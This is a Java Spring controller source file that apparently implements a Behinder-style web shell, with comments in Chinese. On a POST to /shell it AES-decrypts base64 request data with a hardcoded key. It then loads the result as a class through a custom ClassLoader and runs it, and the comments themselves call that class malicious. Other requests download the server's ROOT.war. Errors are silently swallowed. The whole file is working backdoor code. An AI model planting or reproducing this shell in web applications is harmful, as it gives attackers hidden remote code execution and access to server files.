package com.firebasky.ezshell.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Method;

@Controller
//@WebServlet({"/shell"})
public class shellbx extends HttpServlet {
    public shellbx() {
    }
    @PostMapping("/shell")
    protected void service(HttpServletRequest request, HttpServletResponse response) {
        try {
            String k;
            if (request.getMethod().equals("POST")) {//post请求
                response.getWriter().write("post");
                k = "e45e329feb5d925b";//key 密钥
                HttpSession session = request.getSession();
                session.putValue("u", k);//存放的session里面
                Cipher c = Cipher.getInstance("AES");//aes 加密
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] evilClassBytes = (new BASE64Decoder()).decodeBuffer(request.getReader().readLine());
                //读取post请求数据进行base64解码

                class U extends ClassLoader {//自定义加载器
                    U(ClassLoader c) {
                        super(c);
                    }

                    public Class g(byte[] b) {
                        return super.defineClass(b, 0, b.length);//加载字节码
                    }
                }
                Class evilClass = (new U(this.getClass().getClassLoader())).g(c.doFinal(evilClassBytes));
                //进行aes解码，然后通过加载器加载返回恶意的class对象
                Object a = evilClass.newInstance();//实例化恶意类
                Method b = evilClass.getMethod("e", Object.class, Object.class);//通过反射获得e方法
                b.invoke(a, request, response);//执行e方法
            } else {//下载文件，，没用。。
                k = "ROOT.war";
                String path = System.getProperty("user.dir") + File.separator + ".." + File.separator + "webapps" + File.separator + k;
                File file = new File(path);
                String filename = file.getName();
                BufferedInputStream fis = new BufferedInputStream(new FileInputStream(path));
                byte[] buffer = new byte[fis.available()];
                fis.read(buffer);
                fis.close();
                response.reset();
                response.addHeader("Content-Disposition", "attachment;filename=" + new String(filename.getBytes()));
                response.addHeader("Content-Length", "" + file.length());
                BufferedOutputStream toClient = new BufferedOutputStream(response.getOutputStream());
                response.setContentType("application/octet-stream");
                toClient.write(buffer);
                toClient.flush();
                toClient.close();
            }
        } catch (Exception var10) {
        }
    }
}